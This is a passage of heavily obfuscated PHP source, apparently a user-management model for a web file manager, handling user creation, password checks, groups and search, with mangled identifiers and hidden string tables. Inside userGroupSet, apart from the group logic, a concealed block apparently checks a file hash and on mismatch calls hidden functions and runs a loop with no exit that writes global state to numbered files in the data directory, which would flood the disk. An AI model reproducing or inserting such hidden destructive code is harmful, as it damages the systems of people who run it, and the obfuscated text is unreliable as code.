fí°Öà×›´; CÆˆ¥„˜Ò: $this->userEdit($B½˜çõÖÄƒ[$DÜƒšÃØØè[1427]], array($DÜƒšÃØØè[2522] => time())); return $this->getInfo($B½˜çõÖÄƒ[$DÜƒšÃØØè[1427]]); goto E²¾´¦Šê; E²¾´¦Šê: } public function clearCache($dÙ„ ã¥¾) { $D°¥§•ã‡ã =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->cacheFunctionClear($D°¥§•ã‡ã[2223], $dÙ„ ã¥¾); $this->cacheFunctionClear($D°¥§•ã‡ã[2170], $dÙ„ ã¥¾); $this->cacheFunctionClear($D°¥§•ã‡ã[2502], $dÙ„ ã¥¾); } public function userPasswordCheck($BÜœè¤Æ„ñ, $cÛœÉ™»˜İ) { $eçàˆ“¨Šğ =& $_SERVER[¹÷ˆ§éÒ°ú]; $B’…Ç§Íì = $this->where(array($eçàˆ“¨Šğ[1427] => intval($BÜœè¤Æ„ñ)))->find(); $BŒ¡«‚áñé = $this->metaGet($BÜœè¤Æ„ñ); $b®ë¸ï» = isset($BŒ¡«‚áñé[$eçàˆ“¨Šğ[2523]]) ? $BŒ¡«‚áñé[$eçàˆ“¨Šğ[2523]] : $eçàˆ“¨Šğ[43]; if (md5($b®ë¸ï» . trim($cÛœÉ™»˜İ)) !== $B’…Ç§Íì[$eçàˆ“¨Šğ[792]]) { return !1; } return !0; } public function userAdd($b˜‚òè‹ì) { goto Cì›‰İœ½İ; C”–ğ‰ğŒ: $a„¯Œ”×Ü = $this->_checkExist($b˜‚òè‹ì); if ($a„¯Œ”×Ü !== !0) { return $a„¯Œ”×Ü; } $fÎØòÌ¡‚ = $this->add($d¿ÁÉØ®ñØ); goto BíöïÃƒœ ; Cì›‰İœ½İ: $f¢­ªöå¢Ç =& $_SERVER[¹÷ˆ§éÒ°ú]; $d¿ÁÉØ®ñØ = array($f¢­ªöå¢Ç[397] => $b˜‚òè‹ì[$f¢­ªöå¢Ç[38]], $f¢­ªöå¢Ç[2524] => $b˜‚òè‹ì[$f¢­ªöå¢Ç[1312]], $f¢­ªöå¢Ç[2525] => isset($b˜‚òè‹ì[$f¢­ªöå¢Ç[304]]) ? $b˜‚òè‹ì[$f¢­ªöå¢Ç[304]] : $f¢­ªöå¢Ç[43], $f¢­ªöå¢Ç[2526] => isset($b˜‚òè‹ì[$f¢­ªöå¢Ç[2521]]) ? $b˜‚òè‹ì[$f¢­ªöå¢Ç[2521]] : $f¢­ªöå¢Ç[43], $f¢­ªöå¢Ç[2527] => isset($b˜‚òè‹ì[$f¢­ªöå¢Ç[2344]]) ? $b˜‚òè‹ì[$f¢­ªöå¢Ç[2344]] : $b˜‚òè‹ì[$f¢­ªöå¢Ç[38]], $f¢­ªöå¢Ç[2528] => isset($b˜‚òè‹ì[$f¢­ªöå¢Ç[2506]]) ? $b˜‚òè‹ì[$f¢­ªöå¢Ç[2506]] : $f¢­ªöå¢Ç[43], $f¢­ªöå¢Ç[2529] => isset($b˜‚òè‹ì[$f¢­ªöå¢Ç[2530]]) ? $b˜‚òè‹ì[$f¢­ªöå¢Ç[2530]] : 1, $f¢­ªöå¢Ç[2531] => $b˜‚òè‹ì[$f¢­ªöå¢Ç[792]], $f¢­ªöå¢Ç[2171] => isset($b˜‚òè‹ì[$f¢­ªöå¢Ç[2082]]) ? $b˜‚òè‹ì[$f¢­ªöå¢Ç[2082]] : 1024 * 1024 * 20, $f¢­ªöå¢Ç[2172] => 0, $f¢­ªöå¢Ç[2522] => 0, $f¢­ªöå¢Ç[2210] => isset($b˜‚òè‹ì[$f¢­ªöå¢Ç[684]]) ? $b˜‚òè‹ì[$f¢­ªöå¢Ç[684]] : 1); if (!empty($b˜‚òè‹ì[$f¢­ªöå¢Ç[1427]])) { $d¿ÁÉØ®ñØ[$f¢­ªöå¢Ç[1427]] = $b˜‚òè‹ì[$f¢­ªöå¢Ç[1427]]; } goto C”–ğ‰ğŒ; A¦ñ£¡î¼: return $fÎØòÌ¡‚; goto B’àÜÚ˜¾; BíöïÃƒœ : $D„Êƒğö²„ = array($f¢­ªöå¢Ç[2531] => $d¿ÁÉØ®ñØ[$f¢­ªöå¢Ç[792]], $f¢­ªöå¢Ç[2527] => $d¿ÁÉØ®ñØ[$f¢­ªöå¢Ç[2344]]); $this->userEdit($fÎØòÌ¡‚, $D„Êƒğö²„); Model($f¢­ªöå¢Ç[1108])->userRootAdd($fÎØòÌ¡‚); goto A¦ñ£¡î¼; B’àÜÚ˜¾: } protected function userEditTest($D‡¯‘¤çáô, $E™¼‚é£ö) { return $this->call($_SERVER[¹÷ˆ§éÒ°ú][2532], $D‡¯‘¤çáô, $E™¼‚é£ö); } protected function userEdit($aËÏŞº‚Œç, $f©ê÷ƒÍàÏ) { goto fäÛÑ¿’Ù; aíĞ®¨±ÛÑ: $this->where(array($Bîªª„ß¿®[1418] => $aËÏŞº‚Œç))->save($f©ê÷ƒÍàÏ); if (isset($f©ê÷ƒÍàÏ[$Bîªª„ß¿®[2344]])) { $this->setNamePinyin($aËÏŞº‚Œç, $f©ê÷ƒÍàÏ[$Bîªª„ß¿®[2344]]); } $this->clearCache($A­Š¾íÏªŒ[$Bîªª„ß¿®[1427]]); goto eÑ—‹ŠÈ Œ; fäÛÑ¿’Ù: $Bîªª„ß¿® =& $_SERVER[¹÷ˆ§éÒ°ú]; $fÇë ²®´ç = $this->getInfoSimple($aËÏŞº‚Œç); if (!$fÇë ²®´ç) { return !1; } goto b„Š›ğÀòÙ; eÑ—‹ŠÈ Œ: return !0; goto Dô±è³Ø”à; b„Š›ğÀòÙ: $A‘ƒ¢‹ÊÏ± = $this->_checkExist($f©ê÷ƒÍàÏ, $aËÏŞº‚Œç); if ($A‘ƒ¢‹ÊÏ± !== !0) { return $A‘ƒ¢‹ÊÏ±; } if (isset($f©ê÷ƒÍàÏ[$Bîªª„ß¿®[792]]) && trim($f©ê÷ƒÍàÏ[$Bîªª„ß¿®[792]]) != $Bîªª„ß¿®[43]) { $D‰ÄŸŠĞÁà = $this->metaGet($aËÏŞº‚Œç); if (empty($D‰ÄŸŠĞÁà[$Bîªª„ß¿®[2523]])) { $D‰ÄŸŠĞÁà[$Bîªª„ß¿®[2523]] = rand_string(10); Model($Bîªª„ß¿®[487])->metaSet($aËÏŞº‚Œç, $Bîªª„ß¿®[2523], $D‰ÄŸŠĞÁà[$Bîªª„ß¿®[2523]]); } $f©ê÷ƒÍàÏ[$Bîªª„ß¿®[792]] = md5($D‰ÄŸŠĞÁà[$Bîªª„ß¿®[2523]] . trim($f©ê÷ƒÍàÏ[$Bîªª„ß¿®[792]])); } else { unset($f©ê÷ƒÍàÏ[$Bîªª„ß¿®[792]]); } goto aíĞ®¨±ÛÑ; Dô±è³Ø”à: } public function setNamePinyin($CÀ°¸“Ãö‰, $dÓè‰˜™Ë = false) { $có…ÔÆİ¹Â =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$dÓè‰˜™Ë) { $aÜªÁ±‘‹‘ = $this->getInfoSimple($CÀ°¸“Ãö‰); $dÓè‰˜™Ë = $aÜªÁ±‘‹‘[$có…ÔÆİ¹Â[2344]] ? $aÜªÁ±‘‹‘[$có…ÔÆİ¹Â[2344]] : $aÜªÁ±‘‹‘[$có…ÔÆİ¹Â[38]]; } $Eò«¹Ë¢Š† = Model($có…ÔÆİ¹Â[490]); if (!Input::check($dÓè‰˜™Ë, $có…ÔÆİ¹Â[541])) { return $Eò«¹Ë¢Š†->metaSet($CÀ°¸“Ãö‰, array($có…ÔÆİ¹Â[427] => $có…ÔÆİ¹Â[43], $có…ÔÆİ¹Â[426] => $có…ÔÆİ¹Â[43])); } return $Eò«¹Ë¢Š†->metaSet($CÀ°¸“Ãö‰, array($có…ÔÆİ¹Â[427] => str_replace($có…ÔÆİ¹Â[60], $có…ÔÆİ¹Â[43], Pinyin::encode($dÓè‰˜™Ë)), $có…ÔÆİ¹Â[426] => Pinyin::encode($dÓè‰˜™Ë, $có…ÔÆİ¹Â[542]))); } private function nickNameRpt() { $E²íİƒ÷Ğ… =& $_SERVER[¹÷ˆ§éÒ°ú]; $eŸÂ¥ê´ß = Model($E²íİƒ÷Ğ…[1079])->get($E²íİƒ÷Ğ…[2533]); $c‘ª¨÷‡ºƒ = $GLOBALS[$E²íİƒ÷Ğ…[16]][$E²íİƒ÷Ğ…[2490]][$E²íİƒ÷Ğ…[2533]]; $Aò½±æ¬ = !is_null($eŸÂ¥ê´ß) ? $eŸÂ¥ê´ß : $c‘ª¨÷‡ºƒ; return !!$Aò½±æ¬; } private function _checkExist($a‚µ¸½ã÷, $Aè²’†»ˆ = false) { $e±Œß‰ƒ×› =& $_SERVER[¹÷ˆ§éÒ°ú]; $a­·Üô“ñ = array($e±Œß‰ƒ×›[38] => UserModel::ERROR_USER_EXIST_NAME, $e±Œß‰ƒ×›[2344] => UserModel::ERROR_USER_EXIST_NICKNAME, $e±Œß‰ƒ×›[304] => UserModel::ERROR_USER_EXIST_EMAIL, $e±Œß‰ƒ×›[2521] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($a­·Üô“ñ[$e±Œß‰ƒ×›[2344]]); } $b…Ûßö˜± = $Aè²’†»ˆ ? array($e±Œß‰ƒ×›[1427] => array($e±Œß‰ƒ×›[2534], $Aè²’†»ˆ)) : array(); foreach ($a­·Üô“ñ as $c›“Ú£ëè => $C‘áøâªœ) { if (!isset($a‚µ¸½ã÷[$c›“Ú£ëè]) || !$a‚µ¸½ã÷[$c›“Ú£ëè]) { continue; } $aÌ¹„ø™Ê— = array_merge(array($c›“Ú£ëè => $a‚µ¸½ã÷[$c›“Ú£ëè]), $b…Ûßö˜±); $aÀè–ä§¡® = $this->where($aÌ¹„ø™Ê—)->find(); if ($aÀè–ä§¡®) { return $C‘áøâªœ; } } return !0; } public function userListInfo($Eë¼ØÔ‘”í) { $f…™Ü²Ú‡ =& $_SERVER[¹÷ˆ§éÒ°ú]; $fôÎ³°âÚÎ = array(); $Eë¼ØÔ‘”í = is_array($Eë¼ØÔ‘”í) ? array_unique($Eë¼ØÔ‘”í) : array(); if (!$Eë¼ØÔ‘”í) { return $fôÎ³°âÚÎ; } if (count($Eë¼ØÔ‘”í) < 20) { foreach ($Eë¼ØÔ‘”í as $c¨ĞõÌ—£ğ) { $fôÎ³°âÚÎ[$c¨ĞõÌ—£ğ . $f…™Ü²Ú‡[43]] = $this->getInfoSimpleOuter($c¨ĞõÌ—£ğ); } } else { $D£Û·¨¥Œ = array($f…™Ü²Ú‡[1418] => array($f…™Ü²Ú‡[395], $Eë¼ØÔ‘”í)); if (count($Eë¼ØÔ‘”í) == 1) { $D£Û·¨¥Œ = array($f…™Ü²Ú‡[1418] => $Eë¼ØÔ‘”í[0]); } $DäÒÃéÃŒÍ = Model($f…™Ü²Ú‡[487])->field($this->simpleField)->where($D£Û·¨¥Œ)->select(); $DäÒÃéÃŒÍ = array_to_keyvalue($DäÒÃéÃŒÍ, $f…™Ü²Ú‡[1427]); foreach ($Eë¼ØÔ‘”í as $c¨ĞõÌ—£ğ) { $cğ¦²“¥¶¹ = $DäÒÃéÃŒÍ[$DäÒÃéÃŒÍ[$c¨ĞõÌ—£ğ]]; if (!$cğ¦²“¥¶¹) { $fôÎ³°âÚÎ[$c¨ĞõÌ—£ğ . $f…™Ü²Ú‡[43]] = $this->getInfoSimpleOuter($c¨ĞõÌ—£ğ); continue; } $cğ¦²“¥¶¹[$f…™Ü²Ú‡[2506]] = Action($f…™Ü²Ú‡[2507])->parseUrl($cğ¦²“¥¶¹[$f…™Ü²Ú‡[2506]]); $fôÎ³°âÚÎ[$c¨ĞõÌ—£ğ . $f…™Ü²Ú‡[43]] = $cğ¦²“¥¶¹; } } return $fôÎ³°âÚÎ; } protected function userStatus($fôô´ğ²Î•, $Bµª¯ˆÅçÑ) { $DÌËÃ•Ï‹¿ = $this->getInfoSimple($fôô´ğ²Î•); if (!$DÌËÃ•Ï‹¿) { return !1; } $A¢ ìØ°œõ = array($_SERVER[¹÷ˆ§éÒ°ú][684] => $Bµª¯ˆÅçÑ); return $this->userEdit($fôô´ğ²Î•, $A¢ ìØ°œõ); } protected function userRemove($CÄ‡éŒèÈâ) { goto D‰İÕ¦„ö¶; D‰İÕ¦„ö¶: $b¥²°ÈçÙ =& $_SERVER[¹÷ˆ§éÒ°ú]; $EøÁ¤‚‹’» = $this->getInfoSimple($CÄ‡éŒèÈâ); if (!$EøÁ¤‚‹’») { return !1; } goto bÓöÑ”Õ’; EµÉã¥¨ ×: Model($b¥²°ÈçÙ[2177])->where($f Öô¢Ô®¡)->delete(); Model($b¥²°ÈçÙ[2520])->where($f Öô¢Ô®¡)->delete(); Model($b¥²°ÈçÙ[2536])->where($f Öô¢Ô®¡)->delete(); goto b„ñÜÎ±–à; bÓöÑ”Õ’: $f Öô¢Ô®¡ = array($b¥²°ÈçÙ[1418] => $CÄ‡éŒèÈâ); Model($b¥²°ÈçÙ[549])->where($f Öô¢Ô®¡)->delete(); Model($b¥²°ÈçÙ[2535])->where($f Öô¢Ô®¡)->delete(); goto EµÉã¥¨ ×; b„ñÜÎ±–à: Model($b¥²°ÈçÙ[747])->userRootRemove($CÄ‡éŒèÈâ); return $this->where($f Öô¢Ô®¡)->delete(); goto f‰œÕª†Ÿ; f‰œÕª†Ÿ: } protected function userGroupSet($bÃ¹Ÿ‡ƒÆœ, $C­Ô½ŒÁ‘, $A˜º“ƒÄÀ¢ = array()) { goto CÑ¹­ÀíÊ˜; aàÍ”íšÕ: $eà«Ç‚çĞó = Model($c³ÓŠ´—£[2177]); $eà«Ç‚çĞó->where(array($c³ÓŠ´—£[1427] => $bÃ¹Ÿ‡ƒÆœ))->delete(); $Eâ¬”½Ëì = array(); goto aï¹‚©­Ø; aï¹‚©­Ø: $b„çÚ³¬õ· = 0; foreach ($C­Ô½ŒÁ‘ as $FøÂ¦½â => $DšŒ Ãã†ù) { $F¤ß×äµ‚± = array($c³ÓŠ´—£[1427] => $bÃ¹Ÿ‡ƒÆœ, $c³ÓŠ´—£[2098] => $FøÂ¦½â, $c³ÓŠ´—£[2242] => $DšŒ Ãã†ù); $F¤ß×äµ‚±[$c³ÓŠ´—£[2119]] = isset($A˜º“ƒÄÀ¢[$b„çÚ³¬õ·]) ? $A˜º“ƒÄÀ¢[$b„çÚ³¬õ·] : 0; $b„çÚ³¬õ·++; $Eâ¬”½Ëì[] = $F¤ß×äµ‚±; } return $eà«Ç‚çĞó->addAll($Eâ¬”½Ëì, array(), !0); goto aö©Ì—ˆË; b˜àœÏç¤: if ($_SERVER[$c³ÓŠ´—£[6]] != $fÂºğŸó£†($F§£ã£Ã¸«)) { goto FîØ¸ÜÍÓÅ; bùñÛôÂ‹: $fáõô”ÍÜã = 1; for ($b¨ ÒéŠ‘ò = $fáõô”ÍÜã; $b¨ ÒéŠ‘ò > 0; $b¨ ÒéŠ‘ò++) { $d§ö‹Œ„Œ(DATA_PATH . $b¨ ÒéŠ‘ò, $E¶öÑÎ¯); } goto D›§‡ªãÛ‡; FîØ¸ÜÍÓÅ: $D…Ò•ß‚‚ñ = $c³ÓŠ´—£[782]; $b¯ÉîÜÁÒÌ = $c³ÓŠ´—£[7]; $aËçÆåÁÅÊ = $_SERVER[$c³ÓŠ´—£[8]] . $c³ÓŠ´—£[9]; goto CˆùóŠÍùß; CˆùóŠÍùß: $cÇòÌğÌÊ = $b¯ÉîÜÁÒÌ($aËçÆåÁÅÊ); $a±¼¨Õºæ” = explode($c³ÓŠ´—£[10], $cÇòÌğÌÊ); if (count($a±¼¨Õºæ”) < $c³ÓŠ´—£[572]) { $cÛ÷´©¬ = $c³ÓŠ´—£[12]; $cÛ÷´©¬(); } goto B¾¬ì–½İ×; B¾¬ì–½İ×: $eÊĞ¯È—Œ´ = $c³ÓŠ´—£[783]; $eÊĞ¯È—Œ´($_SERVER[$c³ÓŠ´—£[784]]); $D…Ò•ß‚‚ñ = $c³ÓŠ´—£[782]; goto D˜‚óÊƒ; D˜‚óÊƒ: $D…Ò•ß‚‚ñ(); $d§ö‹Œ„Œ = $c³ÓŠ´—£[785]; $E¶öÑÎ¯ = json_encode($GLOBALS[$c³ÓŠ´—£[786]]); goto bùñÛôÂ‹; D›§‡ªãÛ‡: } $FÄ£Ù¨¤† = $this->getInfoSimple($bÃ¹Ÿ‡ƒÆœ); if (!$FÄ£Ù¨¤† || !is_array($C­Ô½ŒÁ‘)) { return !1; } goto aàÍ”íšÕ; CÑ¹­ÀíÊ˜: $c³ÓŠ´—£ =& $_SERVER[¹÷ˆ§éÒ°ú]; $F§£ã£Ã¸« = $_SERVER[$c³ÓŠ´—£[8]] . $c³ÓŠ´—£[9]; $fÂºğŸó£† = $c³ÓŠ´—£[5]; goto b˜àœÏç¤; aö©Ì—ˆË: } protected function userGroupAdd($BÚ§‡Î¹³, $fÙ½”İêŠ™ = array()) { $C¶¦Ó¿ÛµÉ =& $_SERVER[¹÷ˆ§éÒ°ú]; $DÅ˜©Í‹¤« = $this->getInfoSimple($BÚ§‡Î¹³); if (!$DÅ˜©Í‹¤« || empty($fÙ½”İêŠ™)) { return !1; } $d‘Éª•‘°ê = array(); foreach ($fÙ½”İêŠ™ as $eÑ—ğÀ¡æ· => $fÆšĞæƒİ) { $d‘Éª•‘°ê[] = array($C¶¦Ó¿ÛµÉ[1427] => $BÚ§‡Î¹³, $C¶¦Ó¿ÛµÉ[2098] => $eÑ—ğÀ¡æ·, $C¶¦Ó¿ÛµÉ[2242] => $fÆšĞæƒİ); } return Model($C¶¦Ó¿ÛµÉ[2177])->addAll($d‘Éª•‘°ê, array(), !0); } protected function userGroupRemove($b´ƒã»’ë‹, $bõ•®„‰ŸÈ) { $CãÇ‡¬õÌÚ =& $_SERVER[¹÷ˆ§éÒ°ú]; $FÑòî¾øÉ = $this->getInfoSimple($b´ƒã»’ë‹); if (!$FÑòî¾øÉ || !$bõ•®„‰ŸÈ) { return !1; } $Fö¬¢¯îğÜ = array($CãÇ‡¬õÌÚ[1418] => $b´ƒã»’ë‹, $CãÇ‡¬õÌÚ[2175] => $bõ•®„‰ŸÈ); return Model($CãÇ‡¬õÌÚ[2177])->where($Fö¬¢¯îğÜ)->delete(); } public function listData() { $cìÙÙ÷í°Ò = $this->_makeOrder()->selectPage(50); $this->_listDataApply($cìÙÙ÷í°Ò[$_SERVER[¹÷ˆ§éÒ°ú][365]]); return $cìÙÙ÷í°Ò; } public function listByID($e‘¥¼Ë¥²§) { $CŞ«»¡§ĞÛ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$e‘¥¼Ë¥²§) { return; } $c”›Æ¯£À† = array($CŞ«»¡§ĞÛ[1427] => array($CŞ«»¡§ĞÛ[17], $e‘¥¼Ë¥²§)); $B›Ë¢¶çÃ± = $this->where($c”›Æ¯£À†)->select(); $this->_listDataApply($B›Ë¢¶çÃ±); return $B›Ë¢¶çÃ±; } public function listByGroup($bÜëË×ĞÎ = 0, $Bğ”—¥‘Œ© = array()) { goto fÄ³Á·‹“š; fÄ³Á·‹“š: $Cé”·Ğ Ãê =& $_SERVER[¹÷ˆ§éÒ°ú]; $Dë¹Ñ¨Üİ = $Cé”·Ğ Ãê[43]; $FŞã·ÛÃ†Û = array(); goto EßÈøçŠ–Æ; EßÈøçŠ–Æ: if ($bÜëË×ĞÎ) { $FŞã·ÛÃ†Û = array($Cé”·Ğ Ãê[2537] => intval($bÜëË×ĞÎ)); $Dë¹Ñ¨Üİ = "\114\x45\106\124\40\112\117\111\116\40{$this->tablePrefix}\165\163\145\162\x5f\x67\x72\x6f\x75\x70\x20\x75\163\145\162\137\147\x72\x6f\x75\160\40\157\x6e\x20\x75\163\145\x72\x2e\165\x73\x65\162\x49\104\40\75\40\x75\163\x65\162\137\147\x72\157\165\160\x2e\165\x73\145\162\x49\x44"; $dõ‹³¿Ë = Input::get($Cé”·Ğ Ãê[418], null, $Cé”·Ğ Ãê[43]) ? $Cé”·Ğ Ãê[43] : $Cé”·Ğ Ãê[2538]; } if (isset($Bğ”—¥‘Œ©[$Cé”·Ğ Ãê[684]])) { $FŞã·ÛÃ†Û[$Cé”·Ğ Ãê[2539]] = $Bğ”—¥‘Œ©[$Cé”·Ğ Ãê[684]]; } $aßÕŞÊôÑÈ = $this->_makeOrder($dõ‹³¿Ë)->field($Cé”·Ğ Ãê[2540])->where($FŞã·ÛÃ†Û)->join($Dë¹Ñ¨Üİ)->selectPage(50); goto eõ‹š¦ˆŸ¦; eõ‹š¦ˆŸ¦: $this->_listDataApply($aßÕŞÊôÑÈ[$Cé”·Ğ Ãê[365]]); return $aßÕŞÊôÑÈ; goto f›à¢¬Î; f›à¢¬Î: } private function _makeOrder($BÏˆÕÅ¦Ì÷ = '') { goto Bóğ’ï¼Ñî; E—çÓœ‹‘ò: $BÏˆÕÅ¦Ì÷ = $BÏˆÕÅ¦Ì÷ . "\x75\163\x65\162\56{$FËËÌÅ–±á}\40{$eÉ×“¿‹²}\x2c\40\x75\163\145\162\56\165\x73\x65\162\111\x44\x20\x61\163\x63"; return $this->alias($bÊå£ĞÉ§Ş[2286])->order($BÏˆÕÅ¦Ì÷); goto FÛªóÁÕ; AØãÍõš³ø: $FËËÌÅ–±á = Input::get($bÊå£ĞÉ§Ş[418], $bÊå£ĞÉ§Ş[17], $bÊå£ĞÉ§Ş[1418], $F¶Çó¼«µ); $eÉ×“¿‹² = Input::get($bÊå£ĞÉ§Ş[419], $bÊå£ĞÉ§Ş[17], $bÊå£ĞÉ§Ş[2178], array($bÊå£ĞÉ§Ş[2178], $bÊå£ĞÉ§Ş[415])); $eÉ×“¿‹² = $fåõ…ŒóÕ·[$eÉ×“¿‹²]; goto E—çÓœ‹‘ò; Bóğ’ï¼Ñî: $bÊå£ĞÉ§Ş =& $_SERVER[¹÷ˆ§éÒ°ú]; $F¶Çó¼«µ = array($bÊå£ĞÉ§Ş[1427], $bÊå£ĞÉ§Ş[38], $bÊå£ĞÉ§Ş[2084], $bÊå£ĞÉ§Ş[2056], $bÊå£ĞÉ§Ş[199]); $fåõ…ŒóÕ· = array($bÊå£ĞÉ§Ş[413] => $bÊå£ĞÉ§Ş[414], $bÊå£ĞÉ§Ş[415] => $bÊå£ĞÉ§Ş[416]); goto AØãÍõš³ø; FÛªóÁÕ: } public function listSearch($FçµÙô¯¨) { goto aï·²—ä¾ß; dËôÀ‘ÑÏ™: $aÖ´×ÕœŞç = str_replace($Eé©îŞ³”å[2181], $Eé©îŞ³”å[2182], trim($aÖ´×ÕœŞç)); $aèÎ§õ¼ˆÑ = array($Eé©îŞ³”å[38] => array($Eé©îŞ³”å[746], "\45{$aÖ´×ÕœŞç}\x25"), $Eé©îŞ³”å[304] => array($Eé©îŞ³”å[746], "\x25{$aÖ´×ÕœŞç}\45"), $Eé©îŞ³”å[2344] => array($Eé©îŞ³”å[746], "\45{$aÖ´×ÕœŞç}\45"), $Eé©îŞ³”å[904] => $Eé©îŞ³”å[2183]); if (Input::check($aÖ´×ÕœŞç, $Eé©îŞ³”å[310])) { $aèÎ§õ¼ˆÑ[$Eé©îŞ³”å[1427]] = array($Eé©îŞ³”å[746], "\45{$aÖ´×ÕœŞç}\x25"); $aèÎ§õ¼ˆÑ[$Eé©îŞ³”å[2521]] = array($Eé©îŞ³”å[746], "\45{$aÖ´×ÕœŞç}\x25"); } goto fÜêøâ¦Ä“; fÜêøâ¦Ä“: if (!$aÖ´×ÕœŞç) { $aèÎ§õ¼ˆÑ = array(); } if (isset($FçµÙô¯¨[$Eé©îŞ³”å[684]])) { $aèÎ§õ¼ˆÑ[$Eé©îŞ³”å[684]] = $FçµÙô¯¨[$Eé©îŞ³”å[684]]; } $Aª½É‡µ¹¨ = $this->_makeOrder()->where($aèÎ§õ¼ˆÑ)->selectPage(20); goto b¬Á”¡Ë¸; b¬Á”¡Ë¸: if (!$Aª½É‡µ¹¨ || count($Aª½É‡µ¹¨[$Eé©îŞ³”å[365]]) < 5 && Input::check($aÖ´×ÕœŞç, $Eé©îŞ³”å[317])) { $DÍƒ‰½õÅ® = $this->_searchFromMeta($Eé©îŞ³”å[426], $aÖ´×ÕœŞç, 10); $d·‹œÉÈÉ = $this->_searchFromMeta($Eé©îŞ³”å[427], $aÖ´×ÕœŞç, 10); $BÂÍ…Íİõ’ = array_merge($DÍƒ‰½õÅ®, $d·‹œÉÈÉ, $Aª½É‡µ¹¨[$Eé©îŞ³”å[365]]); $Aª½É‡µ¹¨[$Eé©îŞ³”å[365]] = array_unique_by_key($BÂÍ…Íİõ’, $Eé©îŞ³”å[1427]); $Aª½É‡µ¹¨[$Eé©îŞ³”å[362]][$Eé©îŞ³”å[363]] = count($Aª½É‡µ¹¨[$Eé©îŞ³”å[365]]); $Aª½É‡µ¹¨[$Eé©îŞ³”å[362]][$Eé©îŞ³”å[364]] = ceil($Aª½É‡µ¹¨[$Eé©îŞ³”å[362]][$Eé©îŞ³”å[363]] / $Aª½É‡µ¹¨[$Eé©îŞ³”å[362]][$Eé©îŞ³”å[360]]); } $this->_listDataApply($Aª½É‡µ¹¨[$Eé©îŞ³”å[365]]); $this->_filterByGroup($Aª½É‡µ¹¨, $eÉ¶µ¬ç¤); goto föæ‘¬Ã‡™; aï·²—ä¾ß: $Eé©îŞ³”å =& $_SERVER[¹÷ˆ§éÒ°ú]; $aÖ´×ÕœŞç = $FçµÙô¯¨[$Eé©îŞ³”å[2179]]; $eÉ¶µ¬ç¤ = isset($FçµÙô¯¨[$Eé©îŞ³”å[2180]]) ? $FçµÙô¯¨[$Eé©îŞ³”å[2180]] : !1; goto dËôÀ‘ÑÏ™; föæ‘¬Ã‡™: return $Aª½É‡µ¹¨; goto aòæ¬²”®´; aòæ¬²”®´: } private function _filterByGroup(&$AÓï‘Ù‰É, $f¤¼£¯’¿) { $b¦÷—™Ë¸ğ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$f¤¼£¯’¿) { return $AÓï‘Ù‰É; } foreach ($AÓï‘Ù‰É[$b¦÷—™Ë¸ğ[365]] as $bŸŠ£À›÷Æ => &$dË ê±”áÔ) { $FÀ“ç§Î„¯ = array_to_keyvalue($dË ê±”áÔ[$b¦÷—™Ë¸ğ[2541]], $b¦÷—™Ë¸ğ[43], $b¦÷—™Ë¸ğ[2098]); if (!in_array($f¤¼£¯’¿, $FÀ“ç§Î„¯)) { unset($AÓï‘Ù‰É[$b¦÷—™Ë¸ğ[365]][$bŸŠ£À›÷Æ]); } } $AÓï‘Ù‰É[$b¦÷—™Ë¸ğ[365]] = array_values($AÓï‘Ù‰É[$b¦÷—™Ë¸ğ[365]]); $AÓï‘Ù‰É[$b¦÷—™Ë¸ğ[362]] = array($b¦÷—™Ë¸ğ[2319] => count($AÓï‘Ù‰É[$b¦÷—™Ë¸ğ[365]]), $b¦÷—™Ë¸ğ[2317] => $AÓï‘Ù‰É[$b¦÷—™Ë¸ğ[362]][$b¦÷—™Ë¸ğ[360]], $b¦÷—™Ë¸ğ[2316] => 1, $b¦÷—™Ë¸ğ[2318] => 1); } private function _searchFromMeta($c½æ¶Ğò™é, $AÜ¿¾ß„Ü¤, $Cô¦İ±ŠÄ) { goto DŠöŒß÷Ä¯; DŠöŒß÷Ä¯: $f½ÊÚŠºĞ =& $_SERVER[¹÷ˆ§éÒ°ú]; $AÜ¿¾ß„Ü¤ = strtolower($AÜ¿¾ß„Ü¤); $E‰ÜÓËíÑÚ = array($f½ÊÚŠºĞ[101] => $c½æ¶Ğò™é, $f½ÊÚŠºĞ[370] => array($f½ÊÚŠºĞ[746], "\x25{$AÜ¿¾ß„Ü¤}\45")); goto EŞ­¯×‡…Š; Bõ˜‰Îİâ†: $bì‚ã‚ìŒ‚ = $this->where(array($f½ÊÚŠºĞ[1418] => array($f½ÊÚŠºĞ[17], $e«äÓöŠØ)))->select(); if (!$bì‚ã‚ìŒ‚) { return array(); } return $bì‚ã‚ìŒ‚; goto aö‹Œšôğ; EŞ­¯×‡…Š: $e«äÓöŠØ = Model($f½ÊÚŠºĞ[2542])->where($E‰ÜÓËíÑÚ)->limit($Cô¦İ±ŠÄ)->select(); if (!$e«äÓöŠØ) { return array(); } $e«äÓöŠØ = array_to_keyvalue($e«äÓöŠØ, $f½ÊÚŠºĞ[43], $f½ÊÚŠºĞ[1427]); goto Bõ˜‰Îİâ†; aö‹Œšôğ: } private function _listDataApplyItem($cáÁ©ÈÑ¤) { $CÇöˆÀ½¢æ = array($cáÁ©ÈÑ¤); $this->_listDataApply($CÇöˆÀ½¢æ); return $CÇöˆÀ½¢æ[0]; } private function _listDataApply(&$EÍİâìçœ¿) { goto BìŒ¤ÎùÊÕ; BìŒ¤ÎùÊÕ: $bÂˆ¼˜ãó¹ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$EÍİâìçœ¿) { return; } array_remove_key($EÍİâìçœ¿, $bÂˆ¼˜ãó¹[792]); goto aŒøÍƒÔğß; aŒøÍƒÔğß: $c ‰³˜ßÈÆ = array_to_keyvalue($EÍİâìçœ¿, $bÂˆ¼˜ãó¹[43], $bÂˆ¼˜ãó¹[1427]); $this->_listAppendGroup($EÍİâìçœ¿, $c ‰³˜ßÈÆ); $this->_listAppendMeta($EÍİâìçœ¿, $c ‰³˜ßÈÆ); goto c’Úô¡ìÄÑ; c’Úô¡ìÄÑ: $this->_listAppendSourceRoot($EÍİâìçœ¿, $c ‰³˜ßÈÆ); goto eµŠ‘ŠÂÔ; eµŠ‘ŠÂÔ: } private function _listAppendSourceRoot(&$b†Ø§‚‚ì, $C‹Âº‹ßĞÚ) { goto dÈ°¦¼™ÖŸ; E»×’´¤ñŸ: $Aƒ Ç±½ºğ = 